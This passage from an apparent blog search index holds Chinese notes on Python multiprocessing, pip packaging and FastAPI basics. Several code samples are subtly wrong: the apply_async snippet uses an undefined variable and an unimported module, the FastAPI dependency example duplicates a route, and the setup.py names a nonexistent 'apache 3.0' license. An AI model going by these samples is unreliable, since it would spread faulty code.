参数: 信号量的初始值\n# 返回值: 信号量对象\n\nsem.acquire()                 # 信号量减1 当信号量为0时阻塞\nsem.release()                 # 信号量加1\nsem.get_value()       # 获取信号量数量 套接字 套接字（socket）通信 套接口也是一种进程间通信机制, 与其他通信机制不同的是, 它可用于不同机器之间的进程通信. multiprocessing.Manager 共享全局变量 (共享内存) 注意, 如果要共享变量, 只能将共享的变量定义在外部使用, 然后调用进程的时候传入, 最终获取还是在使用外部命名获取: # coding: utf-8\n\n\"\"\"\npython 进程间通信测试,\n\n主进程跟, 异步进程池\n\"\"\"\nimport asyncio\nimport time\nfrom concurrent.futures import ProcessPoolExecutor\nfrom multiprocessing import Manager, Pipe\nfrom typing import Optional\n\n\nclass SonPool(object):\n\n    _total: Optional[int] = None\n    _now: Optional[int] = None\n\n    _total_manager = None\n    _now_manager = None\n    _list_manager = [None, None]\n\n    @classmethod\n    def get_now_and_total(cls):\n        return [cls._now, cls._total]\n\n    @classmethod\n    def get_now_and_total_manager_val(cls):\n        print('_manager', cls._now_manager, cls._total_manager)\n        if cls._now_manager and type(cls._now_manager) != int:\n            print('_manager', cls._now_manager.value, cls._total_manager.value)\n            return [cls._now_manager.value, cls._total_manager.value]\n\n        return [cls._now_manager, cls._total_manager]\n\n    @classmethod\n    def get_list_manager_val(cls):\n        print('inner _list_manager', [x for x in cls._list_manager])\n        return cls._list_manager\n\n    @classmethod\n    def _reset(cls):\n        cls._total = None\n        cls._now = None\n        cls._total_manager = Manager().Value(int, 1)\n        cls._now_manager = Manager().Value(int, 1)\n        cls._list_manager = Manager().list([None, None])\n\n    @staticmethod\n    async def _async_long_time_wait():\n        await asyncio.sleep(3)\n        print('sleep 3 s')\n\n    @staticmethod\n    def _long_time_wait(*args):\n        time.sleep(5)\n        print('sleep 5', *args)\n\n    @classmethod\n    def _set_total(cls):\n        cls._long_time_wait('total')\n        cls._total = 100\n        if cls._total_manager:\n            cls._total_manager.value = 101\n        else:\n            cls._total_manager = 101\n        cls._list_manager.append(102)\n\n    @classmethod\n    def _set_now(cls):\n        cls._long_time_wait('now')\n        cls._now = 10\n        if cls._now_manager:\n            cls._now_manager.value = 11\n        else:\n            cls._now_manager = 11\n        cls._list_manager.append(12)\n\n    @classmethod\n    def run(cls, *args, **kwargs):\n        if args:\n            # cls._list_manager = arg_dict.get('list_manager')\n            cls._list_manager = args[0]\n            cls._total_manager = args[1]\n            cls._now_manager = args[2]\n        cls._set_now()\n        cls._set_total()\n        print('inner SonPool val',\n              '\\ninner now, total: ', SonPool.get_now_and_total(),\n              '\\ninner now, total manager: ', SonPool.get_now_and_total_manager_val(),\n              '\\ninner list manager: ', SonPool.get_list_manager_val(),\n              )\n\n\nasync def main_process():\n    loop = asyncio.get_running_loop()\n    pool = ProcessPoolExecutor()\n\n    # 类内定义变量不支持进程之间共享, 错误用法\n    SonPool._total_manager = Manager().Value(int, None)\n    SonPool._now_manager = Manager().Value(int, None)\n    SonPool._list_manager = Manager().list([None, None])\n\n    # 用变量,  外部定义,  这样传入才可以正确通信\n    list_manager = Manager().list([None, None])\n    total_manager = Manager().Value(int, None)\n    now_manager = Manager().Value(int, None)\n\n  # 这样外部封装也行,  不过传入的时候还是要传入 LocalSonPool.total\n    # class LocalSonPool(object):\n    #     total = Manager().Value(int, None)\n    #     now = Manager().Value(int, None)\n    #     list_m = Manager().list([None, None])\n\n    # 用管道\n    # 还没写,\n    fd1, fd2 = Pipe()\n\n    async def _check_task1(m1, m2):\n        while True:\n            print('check_task1', m1.value, m2.value)\n            await asyncio.sleep(1)\n\n    # async def _check_task2():\n    #     while True:\n    #         print('check_task2', now_manager.value, total_manager.value)\n    #         await asyncio.sleep(1)\n\n    loop.create_task(_check_task1(now_manager, total_manager))\n  # 这样也可以\n    # loop.create_task(_check_task2())\n\n    # await loop.run_in_executor(pool, SonPool.run, )\n    await loop.run_in_executor(pool, SonPool.run,\n                              list_manager,\n                              total_manager,\n                              now_manager,)\n    print('main val',\n          # SonPool main跟进程池用的是两个不同空间的,  所以不能这样用\n          '\\nmain now, total: ', SonPool.get_now_and_total(),\n          '\\nmain now, total manager: ', SonPool.get_now_and_total_manager_val(),\n          '\\nmain list manager: ', SonPool.get_list_manager_val(),\n\n          # 只有下面的这样,  定义在main,  使用main的调用才可以获取到值\n          '\\nouter list manager', [x for x in list_manager],\n          '\\nouter now manager', now_manager.value,\n          '\\nouter total manager', total_manager.value,\n          )\n\n\ndef main():\n    loop = asyncio.get_event_loop()\n    loop.create_task(main_process())\n    loop.run_forever()\n\n\nif __name__ == '__main__':\n    main() 事件 python进程的事件用于主进程控制其他进程的执行, 事件主要提供了三个方法 set、wait、clear. 事件处理的机制: 想象全局定义了一个\"Flag\",\n如果\"Flag\"值为 False, 那么当程序执行 event.wait 方法时就会阻塞,\n如果\"Flag\"值为True, 那么event.wait 方法时便不再阻塞. 其中, clear方法: 将\"Flag\"设置为False, set方法: 将\"Flag\"设置为True: # 来源: https://zhuanlan.zhihu.com/p/446374478\nimport multiprocessing\nimport time\n\nfrom multiprocessing import Process, Queue, set_start_method\n\nevent = multiprocessing.Event()\n\ndef xiao_fan(event):\n  print('小贩: 生产...')\n  print('小贩: 售卖...')\n  # time.sleep(1)\n  print('小贩: 等待就餐')\n  event.set()\n  event.clear()\n  event.wait()\n  print('小贩: 谢谢光临')\n  event.set()\n  event.clear()\n\n\ndef gu_ke(event):\n  print('顾客: 准备买早餐')\n  event.set()\n  event.clear()\n  event.wait()\n  print('顾客: 买到早餐')\n  print('顾客: 享受美食')\n  # time.sleep(2)\n  print('顾客: 付款, 真好吃...')\n  event.set()\n  event.clear()\n\n\nif __name__ == '__main__':\n  set_start_method('fork', True)\n\n  # 创建进程\n  xf = multiprocessing.Process(target=xiao_fan, args=(event,))\n  gk = multiprocessing.Process(target=gu_ke, args=(event, ))\n  # 启动进程\n\n  gk.start()\n  xf.start()\n\n  # time.sleep(2) 互斥锁-进程锁 可使用 multiprocessing 的\nLock() 函数 缓冲I/O 分为：无缓冲，行缓冲，全缓冲 通过 read 和 write 系统调用直接读写文件，就是无缓冲模式，性能也最差。 而通过标准 I/O 库读写文件，就是缓冲模式，标准 I/O 库提供缓冲的目的是尽可能减少 read 和 write 调用的次数，提高性能。 行缓冲模式 当在输入输出中遇到换行符时，才进行实际 I/O 操作。 全缓冲模式 当填满缓冲区时，才进行实际 I/O 操作。 管道和普通文件默认是全缓冲的; 标准输入和标准输出默认是行缓冲的; 标准错误默认是无缓冲的。 获取子进程的返回值 队列: multiprocessing.Queue() Pool.map(): from multiprocessing import Pool\nimport time\n\ndef func(i):\n    return  i*i\n\nif __name__ == '__main__':\n    p = Pool(5)\n    ret = p.map(func,range(10))\n    print(ret) pool.apply_async: from multiprocessing import Pool\n\ndef func(): return 1\n\npool = multiprocessing.Pool(processes=1)\np = pool.apply_async(func, (i,))\n\npool.close()    # 关闭进程池，表示不能再往进程池中添加进程，需要在join之前调用\npool.join()     # 等待进程池中的所有进程执行完毕\n\nprint(p.get())  # 使用get获取值 multiprocessing.Manager: from multiprocessing import Manager\n\nManager().list() 一些报错 can't pickle _thread.lock objects 使用进程池报错, TypeError: can't pickle _thread.lock objects from concurrent.futures.process import ProcessPoolExecutor 进程池内部处理使用了pickle模块(用于python特有的类型和python的数据类型间进行转换)\n中的dump(obj, file, protocol=None,)方法对参数进行了封装处理. 而pickle dump 方法不支持自定义的类. pickle用来序列化对象很方便, 但是pickle对传入对象的要求是不能是内部类, 也不能是lambda函数. 解决 方法一: 使用dill包来代替, 使用方法和pickle一样: pip install dill 使用: import dill\n\n\nclass Obj:\n  def __init__(self, info):\n    self.info = info\n\n\nobj = Obj(\"this is a local object\")\n\npk = dill.dumps(obj)\nnew_obj = dill.loads(pk) dill扩展了python的pickle模块, 用于对大多数内置python类型进行序列化和反序列化.\n序列化是将对象转换为字节流的过程, 而相反的过程是将字节流转换回python对象层次结构. 所以如果遇到了pickle模块无法序列化的对象, 不妨试试dill. 方法二: from pathos.multiprocessing import ProcessingPool 使用pathos的进程池 https://github.com/uqfoundation/pathos 方法三: 将定义(或者说定义的闭包)放在外部 一些坑 系统: MacOS 12. Python3.9 多进程使用 multiprocessing.Lock , 如果定义在全局变量然后使用是不可行的. threading模块貌似没有这个问题, 应该是全局解释器锁的原因. 全局定义示例代码: # coding: utf-8\nimport time\nfrom multiprocessing import Lock, Process\n\nlock = Lock()\n\ndef run1():\n    lock.acquire()\n    print('run1 get lock')\n    time.sleep(3)\n\ndef run2():\n    lock.acquire()\n    print('run2 get lock')\n    time.sleep(3)\n    print('run2 release lock')\n    lock.release()\n\nif __name__ == '__main__':\n\n    p1 = Process(target=run1,)\n    p2 = Process(target=run2,)\n\n    p1.start()\n    p1.join()\n    p2.start()\n\n    time.sleep(5)\n    print('main thread release lock')\n    lock.release() 错误输出: run1 get lock\nrun2 get lock\nrun2 release lock\nTraceback (most recent call last):\n  File \"/Users/yanque/project/pycharm/mytest/with_mul_process/global_lock2.py\", line 30, in <module>\n    lock.release()\nValueError: semaphore or lock released too many times\nmain thread release lock 可以看到连续 acquire 了两次锁... 而且之前的demo还没有报错信息 这里估计是变量的多进程多核访问问题, 网上很多文章都用的全局变量定义, 误导人. 不使用全局变量而是传值之后: # coding: utf-8\nimport time\nfrom multiprocessing import Lock, Process\n\ndef run1(lock: Lock):\n    lock.acquire()\n    print('run1 get lock')\n    time.sleep(3)\n\ndef run2(lock: Lock):\n    lock.acquire()\n    print('run2 get lock')\n    time.sleep(3)\n    print('run2 release lock')\n    lock.release()\n\nif __name__ == '__main__':\n    _lock = Lock()\n    p1 = Process(target=run1, args=(_lock,), )\n    p2 = Process(target=run2, args=(_lock,), )\n\n    p1.start()\n    p1.join()\n    p2.start()\n\n    time.sleep(5)\n    print('main thread release lock')\n    _lock.release() 输出正常了: run1 get lock\nmain thread release lock\nrun2 get lock\nrun2 release lock 当天下班想起这个问题, 突然反应过来 不同进程分配的是不同的资源, 所以使用全局变量的时候, 每个进程使用的都是不同的全局变量, 所以会出现异常的问题.","tags":"后端; python","url":"/yq-docs-rear-end-python-Concept-multi-Progress.html","loc":"/yq-docs-rear-end-python-Concept-multi-Progress.html"},{"title":"生成随机字符串","text":"生成随机字符串: #!/usr/bin/env python2.7\n# -*- coding: utf-8 -*-\n\nimport random\nimport string\n\ndef ranstr(num):\n    salt = ''.join(random.sample(string.ascii_letters + string.digits, num))\n\n    return salt\n\nsalt = ranstr(6)\nprint salt random.sample(str, num) 从str字符串中随机选取num个字符 string.ascii_letters 返回26个英文字母的大小写字符串 string.digits 返回阿拉伯数字的字符串。","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Generate-random-string.html","loc":"/yq-docs-rear-end-python-Tutorial-Generate-random-string.html"},{"title":"自制pip包","text":"自制pip包, 打包为 whl / tar.gz 格式 首先需要自己的一份源码, 一般结构如下,\nsrc目录下是自己的源代码, 注意要有 __init__ 文件表示是一个python模块: ├── LICENSE\n├── README.md\n├── pyproject.toml\n├── setup.py\n└── src\n    ├── __init__.py\n    └── win_clip_file.py 其他根目录下文件是相关配置, 其中setup.py是生成脚本, 一般内容如下, 根据实际修改: from setuptools import setup, find_packages\n\nsetup(name='win_clipboard',\n      version='0.0.1',\n      description='to windows, copy file',\n      # long_description='',\n      # long_description_content_type=\"text/markdown\",  # 模块详细介绍格式\n      # url=\"github地址\",  # 模块github地址\n      author='yan que',\n      author_email='yanquer@qq.com',\n      requires=['win32clipboard', ],  # 定义依赖哪些模块\n      # packages=find_packages(),  # 系统自动从当前目录开始找包\n      # 如果有的文件不用打包，则只能指定需要打包的文件\n      packages=['win_clipboard', ],  # 指定目录中需要打包的py文件，注意不要.py后缀\n      # 模块相关的元数据（更多的描述）\n      #     classifiers=[\n      #         \"Programming Language :: Python :: 3\",\n      #         \"License :: OSI Approved :: MIT License\",\n      #         \"Operating System :: Independent\",\n      #     ],\n      # 依赖模块\n      install_requires=[\n          \"pywin32\"\n      ],\n      # python版本\n      python_requires=\">=3\",\n      license=\"apache 3.0\"\n      ) setup参数说明: name 打包后包的文件名 version 版本号 author 作者 author_email 作者的邮箱 py_modules 要打包的.py文件 packages 打包的python文件夹 include_package_data 项目里会有一些非py文件,比如html和js等,这时候就要靠include_package_data 和 package_data 来指定了。 package_data:一般写成{‘your_package_name': [\"files\"]}, include_package_data还没完,还需要修改MANIFEST.in文件. MANIFEST.in文件的语法为: include xxx/xxx/xxx/.ini/(所有以.ini结尾的文件,也可以直接指定文件名) license 支持的开源协议 description 对项目简短的一个形容 ext_modules 是一个包含Extension实例的列表,Extension的定义也有一些参数。 ext_package 定义extension的相对路径 requires 定义依赖哪些模块 provides 定义可以为哪些模块提供依赖 data_files 指定其他的一些文件(如配置文件),规定了哪些文件被安装到哪些目录中。\n如果目录名是相对路径,则是相对于sys.prefix或sys.exec_prefix的路径。如果没有提供模板,会被添加到MANIFEST文件中 打包: python setup.py bdist_wheel # 打包为whl文件\npython setup.py sdist # 打包为tar.gz文件 会生成在当前目录下dist文件夹下面 若需要上传到pypi\n需要先去注册账号 https://pypi.org/ 上传需要安装twine: pip install twine\ntwine upload dist/*\n# 输入刚注册的用户名密码就能上传。","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Homemade-PIP-package.html","loc":"/yq-docs-rear-end-python-Tutorial-Homemade-PIP-package.html"},{"title":"基本路由","text":"参考: FastAPI 基本路由 可以先看前面的例子: 简单使用 定义路由是装饰器: @app.get(\"/\")","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Basic-route.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Basic-route.html"},{"title":"结构详解","text":"源于: FastAPI FastAPI 站在以下巨人的肩膀之上： Starlette 负责 web 部分。 Pydantic 负责数据部分。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Detailed-structure.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Detailed-structure.html"},{"title":"FastAPI-Pydantic模型","text":"参考: FastAPI Pydantic 模型 Pydantic 是一个用于数据验证和序列化的 Python 模型库。\n它在 FastAPI 中广泛使用，用于定义请求体、响应体和其他数据模型，提供了强大的类型检查和自动文档生成功能。\n以下是关于 Pydantic 模型的详细介绍： 定义 Pydantic 模型 使用 Pydantic 定义一个模型非常简单，只需创建一个继承自 pydantic.BaseModel 的类，\n并在其中定义字段。字段的类型可以是任何有效的 Python 类型，也可以是 Pydantic 内置的类型: from pydantic import BaseModel\n\nclass Item(BaseModel):\n    name: str\n    description: str = None\n    price: float\n    tax: float = None 以上代码中中，我们定义了一个名为 Item 的 Pydantic 模型，\n包含了四个字段：name、description、price 和 tax，name 和 price 是必需的字段，\n而 description 和 tax 是可选的字段，其中 tax 的默认值为 None。 使用 Pydantic 模型 请求体验证 在 FastAPI 中，可以将 Pydantic 模型用作请求体（Request Body），\n以自动验证和解析客户端发送的数据: from fastapi import FastAPI\nfrom pydantic import BaseModel\n\napp = FastAPI()\n\nclass Item(BaseModel):\n    name: str\n    description: str = None\n    price: float\n    tax: float = None\n\n@app.post(\"/items/\")\ndef create_item(item: Item):\n    return item 以上代码中中，create_item 路由处理函数接受一个名为 item 的参数，\n其类型是 Item 模型。FastAPI 将自动验证传入的 JSON 数据是否符合模型的定义，\n并将其转换为 Item 类型的实例。 查询参数验证 Pydantic 模型还可以用于验证查询参数、路径参数等: from fastapi import FastAPI, Query\nfrom pydantic import BaseModel\n\napp = FastAPI()\n\nclass Item(BaseModel):\n    name: str\n    description: str = None\n    price: float\n    tax: float = None\n\n@app.get(\"/items/\")\ndef read_item(item: Item, q: str = Query(..., max_length=10)):\n    return {\"item\": item, \"q\": q} 以上代码中，read_item 路由处理函数接受一个 Item 模型的实例作为查询参数，\n以及一个名为 q 的字符串查询参数。\n通过使用 Query 函数，我们还可以为查询参数指定更多的验证规则，如最大长度限制。 自动文档生成 使用 Pydantic 模型的一个重要优势是，它能够自动为 FastAPI 生成交互式 API 文档。\n文档会包括模型的字段、类型、验证规则等信息，让开发者和 API 使用者能够清晰地了解如何正确使用 API。 数据转换和序列化 Pydantic 模型不仅提供了验证功能，还可以用于将数据转换为特定类型（例如 JSON）或反向序列化。\n在 FastAPI 中，这种能力是自动的，你无需手动处理。 通过使用 Pydantic 模型，你可以更轻松地定义和验证数据，\n使得代码更清晰、更健壮，并通过自动生成的文档提供更好的 API 交互体验。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Fastapi-Pydantic-model.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Fastapi-Pydantic-model.html"},{"title":"表单数据","text":"在 FastAPI 中，接收表单数据是一种常见的操作，通常用于处理用户通过 HTML 表单提交的数据。 FastAPI 提供了 Form 类型，可以用于声明和验证表单数据。 声明表单数据模型 接下来我们设计一个接收一个登陆的表单数据，要使用表单，需预先安装 python-multipart: pip install python-multipart 代码如下: from fastapi import FastAPI, Form\n\napp = FastAPI()\n\n\n@app.post(\"/login/\")\nasync def login(username: str = Form(), password: str = Form()):\n    return {\"username\": username} 接下来我们可以进入 API 文档 http://127.0.0.1:8000/docs 进行测验 响应: 使用 Pydantic 模型来声明表单数据模型。\n在模型中，使用 Field 类型声明每个表单字段，并添加必要的验证规则: from pydantic import BaseModel, Field\n\nclass Item(BaseModel):\n    name: str = Field(..., title=\"Item Name\", max_length=100)\n    description: str = Field(None, title=\"Item Description\", max_length=255)\n    price: float = Field(..., title=\"Item Price\", gt=0) 除了可以在 API 文档中测验，另外我们也可以自己创建 html 来测试: <form action=\"http://localhost:8000/items/\" method=\"post\">\n    <label for=\"name\">Name:</label>\n    <input type=\"text\" id=\"name\" name=\"name\" required>\n    <br>\n    <label for=\"description\">Description:</label>\n    <textarea id=\"description\" name=\"description\"></textarea>\n    <br>\n    <label for=\"price\">Price:</label>\n    <input type=\"number\" id=\"price\" name=\"price\" required min=\"0\">\n    <br>\n    <button type=\"submit\">Submit</button>\n</form> 在路由中接收表单数据 在路由操作函数中，可以使用 Form 类型来接收表单数据。\nForm 类型的参数可以与 Pydantic 模型的字段一一对应，以实现表单数据的验证和转换: from fastapi import FastAPI, Form\n\napp = FastAPI()\n\n# 路由操作函数\n@app.post(\"/items/\")\nasync def create_item(\n    name: str = Form(...),\n    description: str = Form(None),\n    price: float = Form(..., gt=0),\n):\n    return {\"name\": name, \"description\": description, \"price\": price} 以上例子中，create_item 路由操作函数接收了三个表单字段: name、description 和 price，\n这些字段与 Item 模型的相应字段一致，FastAPI 将自动根据验证规则验证表单数据。\n接下来我们可以进入 API 文档 http://127.0.0.1:8000/docs 进行测验： 响应: 表单数据的验证和文档生成 使用 Pydantic 模型和 Form 类型，表单数据的验证和文档生成都是自动的。 FastAPI 将根据模型中的字段信息生成交互式 API 文档，并根据验证规则进行数据验证。\nAPI 文档地址 http://127.0.0.1:8000/docs 。 处理文件上传 如果表单包含文件上传，可以使用 UploadFile 类型处理。\n以下是一个处理文件上传的实例: from fastapi import FastAPI, File, UploadFile\n\napp = FastAPI()\n\n# 路由操作函数\n@app.post(\"/files/\")\nasync def create_file(file: UploadFile = File(...)):\n    return {\"filename\": file.filename} 在这个例子中，create_file 路由操作函数接收了一个 UploadFile 类型的文件参数。\nFastAPI 将负责处理文件上传，并将文件的相关信息包装在 UploadFile 对象中，\n可以轻松地获取文件名、内容类型等信息。\n通过上述方式，FastAPI 提供了一种简单而强大的方法来接收和处理表单数据，同时保持了代码的清晰性和可维护性。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Form-data.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Form-data.html"},{"title":"安装配置","text":"FastAPI 依赖 Python 3.8 及更高版本。 安装 FastAPI 很简单，这里我们使用 pip 命令来安装: pip install fastapi 另外我们还需要一个 ASGI 服务器，生产环境可以使用 Uvicorn 或者 Hypercorn : pip install \"uvicorn[standard]\" 注解 两个合起来就是: pip install fastapi \"uvicorn[standard]\"","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Installation.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Installation.html"},{"title":"交互式API文档","text":"参考: FastAPI 交互式 API 文档 FastAPI 提供了内置的交互式 API 文档，使开发者能够轻松了解和测试 API 的各个端点。\n这个文档是自动生成的，基于 OpenAPI 规范，\n支持 Swagger UI 和 ReDoc 两种交互式界面。 通过 FastAPI 的交互式 API 文档，开发者能够更轻松地理解和使用 API，提高开发效率 在运行 FastAPI 应用时，Uvicorn 同时启动了交互式 API 文档服务。\n默认情况下，你可以通过访问: http://127.0.0.1:8000/docs 来打开 Swagger UI 风格的文档 或者访问: http://127.0.0.1:8000/redoc 来打开 ReDoc 风格的文档。 ReDoc 是另一种交互式文档界面，具有清晰简洁的外观。\n它使得开发者能够以可读性强的方式查看 API 的描述、请求和响应。\n与 Swagger UI 不同， ReDoc 的设计强调文档的可视化和用户体验。 注解 个人感觉 ReDoc 好看些, 不过 ReDoc 貌似不支持在文档调用API 交互式文档的优势 实时更新 交互式文档会实时更新，反映出应用代码的最新更改。 自动验证 输入参数的类型和格式会得到自动验证，降低了错误的可能性。 便于测试 可以直接在文档中进行 API 请求测试，避免使用其他工具。 升级实例 我们借助 Pydantic 来使用标准的 Python 类型声明请求体: from typing import Union\n\nfrom fastapi import FastAPI\nfrom pydantic import BaseModel\n\napp = FastAPI()\n\n\nclass Item(BaseModel):\n    name: str\n    price: float\n    is_offer: Union[bool, None] = None\n\n\n@app.get(\"/\")\ndef read_root():\n    return {\"Hello\": \"World\"}\n\n\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int, q: Union[str, None] = None):\n    return {\"item_id\": item_id, \"q\": q}\n\n\n@app.put(\"/items/{item_id}\")\ndef update_item(item_id: int, item: Item):\n    return {\"item_name\": item.name, \"item_id\": item_id}","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Interactive-API-document.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Interactive-API-document.html"},{"title":"路径操作依赖项","text":"参考: FastAPI 路径操作依赖项 FastAPI 提供了简单易用，但功能强大的依赖注入系统，\n这个依赖系统设计的简单易用，可以让开发人员轻松地把组件集成至 FastAPI。 FastAPI 提供了路径操作依赖项（Path Operation Dependencies）的机制，\n允许你在路由处理函数执行之前或之后运行一些额外的逻辑。 依赖项就是一个函数，且可以使用与路径操作函数相同的参数。 路径操作依赖项提供了一种灵活的方式来组织代码、验证输入、进行身份验证等。 接下来我们会具体介绍 FastAPI 路径操作依赖项的相关知识点。 依赖项（Dependencies） 依赖项是在路由操作函数执行前或后运行的可复用的函数或对象。 它们被用于执行一些通用的逻辑，如验证、身份验证、数据库连接等。\n在 FastAPI 中，依赖项通常用于两个方面： 预处理（Before）依赖项： 在路由操作函数执行前运行，用于预处理输入数据，验证请求等。 后处理（After）依赖项： 在路由操作函数执行后运行，用于执行一些后处理逻辑，如日志记录、清理等。 依赖注入 依赖注入是 将依赖项注入到路由操作函数中的过程 在 FastAPI 中，通过 在路由操作函数参数中声明依赖项 来实现依赖注入。 FastAPI 将负责解析依赖项的参数，并确保在执行路由操作函数之前将其传递给函数。 依赖项的使用 定义依赖项: from fastapi import Depends, FastAPI\n\napp = FastAPI()\n\n# 依赖项函数\ndef common_parameters(q: str = None, skip: int = 0, limit: int = 100):\n    return {\"q\": q, \"skip\": skip, \"limit\": limit} 在这个例子中，common_parameters 是一个依赖项函数，用于预处理查询参数。\n在路由中使用依赖项: from fastapi import Depends\n\n# 路由操作函数\n@app.get(\"/items/\")\nasync def read_items(commons: dict = Depends(common_parameters)):\n    return commons 在这个例子中，read_items 路由操作函数中的参数 commons 使用了 Depends(common_parameters)，\n表示 common_parameters 是一个依赖项。\nFastAPI 将在执行路由操作函数之前运行 common_parameters 函数，并将其返回的结果传递给 read_items 函数。 路径操作依赖项的基本使用 预处理（Before） 以下实例中，common_parameters 是一个依赖项函数，\n它接受查询参数 q、skip 和 limit，并返回一个包含这些参数的字典。 在路由操作函数 read_items 中，通过传入 Depends(common_parameters)，\n我们使用了这个依赖项函数，实现了在路由执行前预处理输入数据的功能: from fastapi import Depends, FastAPI, HTTPException\n\napp = FastAPI()\n\n# 依赖项函数\ndef common_parameters(q: str = None, skip: int = 0, limit: int = 100):\n    return {\"q\": q, \"skip\": skip, \"limit\": limit}\n\n# 路由操作函数\n@app.get(\"/items/\")\nasync def read_items(commons: dict = Depends(common_parameters)):\n    return commons 后处理（After） 以下例子中, after_request 是一个后处理函数，用于在路由执行后执行一些逻辑。 在路由操作函数 read_items_after 中，通过传入 Depends(after_request) ，\n我们使用了这个后处理依赖项，实现了在路由执行后进行额外操作的功能: from fastapi import Depends, FastAPI, HTTPException\n\napp = FastAPI()\n\n# 依赖项函数\ndef common_parameters(q: str = None, skip: int = 0, limit: int = 100):\n    return {\"q\": q, \"skip\": skip, \"limit\": limit}\n\n# 路由操作函数\n@app.get(\"/items/\")\nasync def read_items(commons: dict = Depends(common_parameters)):\n    return commons\n\n# 后处理函数\nasync def after_request():\n    # 这里可以执行一些后处理逻辑，比如记录日志\n    pass\n\n# 后处理依赖项\n@app.get(\"/items/\", response_model=dict)\nasync def read_items_after(request: dict = Depends(after_request)):\n    return {\"message\": \"Items returned successfully\"} 多个依赖项的组合 以下例子中，common_parameters 和 verify_token 是两个不同的依赖项函数，\nverify_token 依赖于 common_parameters，这种组合依赖项的方式允许我们在路由执行前先验证一些参数，然后在进行身份验证: from fastapi import Depends, FastAPI, HTTPException\n\napp = FastAPI()\n\n# 依赖项函数1\ndef common_parameters(q: str = None, skip: int = 0, limit: int = 100):\n    return {\"q\": q, \"skip\": skip, \"limit\": limit}\n\n# 依赖项函数2\ndef verify_token(token: str = Depends(common_parameters)):\n    if token is None:\n        raise HTTPException(status_code=400, detail=\"Token required\")\n    return token\n\n# 路由操作函数\n@app.get(\"/items/\")\nasync def read_items(token: dict = Depends(verify_token)):\n    return token 异步依赖项 依赖项函数和后处理函数可以是异步的，允许在它们内部执行异步操作。\n以下例子中，get_token 是一个异步的依赖项函数，模拟了一个异步操作。\n在路由操作函数 read_items 中，我们使用了这个异步依赖项函数: from fastapi import Depends, FastAPI, HTTPException\nfrom typing import Optional\nimport asyncio\n\napp = FastAPI()\n\n# 异步依赖项函数\nasync def get_token():\n    # 模拟异步操作\n    await asyncio.sleep(2)\n    return \"fake-token\"\n\n# 异步路由操作函数\n@app.get(\"/items/\")\nasync def read_items(token: Optional[str] = Depends(get_token)):\n    return {\"token\": token} 通过使用路径操作依赖项，你可以在路由执行前或后执行额外的逻辑，从而实现更灵活、可组合的代码组织方式。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Fastapi-Path-operation-dependencies.html","loc":"/yq-docs-rear-end-python-Web-framework-Fastapi-Path-operation-dependencies.html"},{"title":"请求和响应","text":"参考: FastAPI 请求和响应 在 FastAPI 中，请求（Request）和响应（Response）是与客户端交互的核心。\nFastAPI 提供了强大的工具来解析请求数据，并根据需要生成规范的响应。\n接下来我们来详细看下 FastAPI 的请求和响应。\nHTTP 相关内容可以参考: HTTP 请求方法 请求数据 查询参数 以下实例中我们定义了一个 /items/ 路由，接受两个查询参数 skip 和 limit，它们的类型均为整数，默认值分别为 0 和 10: from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/items/\")\ndef read_item(skip: int = 0, limit: int = 10):\n    return {\"skip\": skip, \"limit\": limit} 在命令行中运行以下命令以启动应用: uvicorn main:app --reload 现在，打开浏览器并访问 http://127.0.0.1:8000/items/ ，返回了默认的 JSON 数据: {\"skip\": 0, \"limit\": 10} 路径参数 我们可以把参数设置在路径上，这样 URL 看起来更美观一些。\n以下实例我们定义了一个带有路径参数 item_id 和查询参数 q 的路由: from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int, q: str = None):\n    return {\"item_id\": item_id, \"q\": q} 传递 GET 请求的参数 http://127.0.0.1:8000/items/5/?q=runoob ，\n返回 JSON 数据如下所示: {\"item_id\": 5, \"q\": \"runoob\"} 请求体 接下来我们创建了一个 /items/ 路由，\n使用 @app.post 装饰器表示这是一个处理 POST 请求的路由: from pydantic import BaseModel\nfrom fastapi import FastAPI\n\napp = FastAPI()\nclass Item(BaseModel):\n    name: str\n    description: str = None\n    price: float\n    tax: float = None\n\n@app.post(\"/items/\")\ndef create_item(item: Item):\n    return item 使用 Pydantic 模型 Item 定义了一个请求体，包含多个字段，\n其中一些有默认值，更多 Pydantic 介绍参考: FastAPI Pydantic 模型 接下来我们可以打开 http://127.0.0.1:8000/docs 来进行 POST 测试：\n填写请求参数： 返回结果: 响应数据 返回 JSON 数据 路由处理函数返回一个字典，该字典将被 FastAPI 自动转换为 JSON 格式，并作为响应发送给客户端: from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/items/\")\ndef read_item(skip: int = 0, limit: int = 10):\n    return {\"skip\": skip, \"limit\": limit} 以上代码在浏览器访问 http://127.0.0.1:8000/items/ ，返回了 JSON 数据: {\"skip\": 0, \"limit\": 10} 返回 Pydantic 模型 路由处理函数返回一个 Pydantic 模型实例，FastAPI 将 自动将其转换为 JSON 格式 ，并作为响应发送给客户端: from pydantic import BaseModel\nfrom fastapi import FastAPI\n\napp = FastAPI()\nclass Item(BaseModel):\n    name: str\n    description: str = None\n    price: float\n    tax: float = None\n\n@app.post(\"/items/\")\ndef create_item(item: Item):\n    return item POST 请求，返回的数据格式如下所示: {\n  \"name\": \"runoob\",\n  \"description\": \"菜鸟教程 POST 测试\",\n  \"price\": 12,\n  \"tax\": 1\n} 请求头和 Cookie 使用 Header 和 Cookie 类型注解获取请求头和 Cookie 数据: from fastapi 